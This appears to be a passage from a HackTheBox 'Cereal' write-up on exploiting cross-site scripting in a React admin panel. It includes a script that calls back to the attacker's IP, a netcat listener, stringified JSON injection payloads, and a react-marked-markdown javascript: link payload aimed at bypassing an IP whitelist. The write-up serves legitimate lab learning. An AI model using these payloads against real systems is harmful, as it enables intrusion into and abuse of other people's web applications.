# XSS in Admin Panel

We cannot access the Admin Panel, due to it being an authenticated `PrivateRoute`. However, we can see that it renders cereal request objects on the page, which may make it vulnerable to a cross-site scripting attack.

```jsx
<div>
	{requestData &&
		<Card.Body>
			Description:{requestData.description}
			<br />
			Color:{requestData.color}
			<br />
			Flavor:{requestData.flavor}
		</Card.Body>
	}
</div>
```

This is assuming there is a simulated 'admin' user viewing this page. This is sometimes the case on HacktheBox, for example on the Crossfit machine.

**How can we leverage the XSS?**

The IP whitelist means that only the box itself can make requests to certain methods, including the vulnerable one we wish to target. If we can make the box make a HTTP request using javascript, we can bypass the IP restriction.

**Note**

When I first tried this box, I couldn't initially get the XSS working and instead moved on to testing the Deserialisaton. I've reordered what I tried in the writeup slightly as it made more sense this way, but as always you can skip to the [[30 - XSS#Fixing the XSS|correct method]] if you don't want to read about my failed attempts.

## Trying a Basic XSS

We create a simple javascript file, `0.js`, that makes a request to our box. This is just to test we can run javascript on the box.

```javascript
var oReq = new XMLHttpRequest();
oReq.open("GET", "http://10.10.14.62/example.txt");
oReq.send();
```

We then want to submit a request to this javascript file as a script in the description field.

```javascript
<script src="10.10.14.62/0.js"></script>
```

To generate this, we run the stringify script on the following JSON:

```javascript
console.log(JSON.stringify({ JSON: JSON.stringify({title:'t',flavor:'f',color:'#FFF',description:'<script src="10.10.14.62/0.js"></script>' }) }))
```

Which creates our payload:

```json
{"JSON":"{\"title\":\"t\",\"flavor\":\"f\",\"color\":\"#FFF\",\"description\":\"<script src=\\\"10.10.14.62/0.js\\\"></script>\"}"}
```

We could make the `XMLHTTPRequest()` in the description field, but it is much nicer to request a file as a script source - it keeps the payload short, and allows us to easily edit the file on our box.

Our final bit of setup is to run a netcat listener to catch the request:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/cereal/test-www]
└─$ sudo nc -lnvp 80
[sudo] password for mac: 
listening on [any] 80 ...
```

Then we submit the payload and wait for a response:

![[Pasted image 20210406101322.png]]

We don't get anything back to netcat. Creating a `0.html` file that runs our `0.js` script locally does give us a response, so we know the `XMLHTTPRequest` works and the server is setup correctly:

![[Pasted image 20210406101542.png]]

This suggests the description field may not be vulnerable in this way, or there is something preventing the box from making outgoing requests.

## Fixing the XSS

When I first did this box, I wasn't sure which parts of my payload were broken until I tested them all together. It turned out to be, well, both parts. But rather than writing this up in chronological order and having a broken XSS payload for half of my writeup, I've moved the correct CVE to this section. As always, you can skip to the final [[35 - Exploit Chain#Submitting our Test Payload|working payload]] if you want.

### Markdown Overview

When I took another look at the code in `ClientApp/src/AdminPage/AdminPage.jsx`, I noticed something I'd missed before:

![[Pasted image 20210607210839.png]]

I googled "markdown preview xss" first, but that gave me some [generic markdown XSS payloads](https://medium.com/taptuit/exploiting-xss-via-markdown-72a61e774bf8). They ultimately didn't look right - I suspected if a basic `<script>` tag wouldn't work on a Hard box, then neither would a [basic script tag rendered by markdown](https://github.com/JakobRPennington/InformationSecurity/blob/master/Payloads/md/XSS.md). So I looked at the source of the `MarkdownPreview` element (`import { MarkdownPreview } from 'react-marked-markdown';`) and googled "react-marked-markdown xss" instead.

This [snyk post](https://snyk.io/vuln/npm:react-marked-markdown:20180517) and corresponding [git repo](https://github.com/advisories/GHSA-m7qm-r2r5-f77q) looked more promising. They described a proof of concept in the `value` field of the `MarkdownPreview` element:

```jsx
import React from 'react'
import ReactDOM from 'react-dom'
import { MarkdownPreview } from 'react-marked-markdown'

ReactDOM.render(
<MarkdownPreview
markedOptions={{ sanitize: true }}
value={'[XSS](javascript: alert`1`)'}
/>,
document.getElementById('root')
)
```

Our cereal's `title` is inserted into this field! So in theory we can create one with a title similar to the following:

```jsx
[mouldy cereal](javascript: var oReq = new XMLHttpRequest();oReq.open("GET", "http://localhost/requests?id=9");oReq.send();)
```

To test this works, we need to move on to the next stage - chaining this and the deserialisation payload together.

In general it's good to test things locally before sending them at the remote application, and I would do that on a real assessment. But as it's just HTB and there's no need for opsec, I decided not to fiddle around with building the app locally.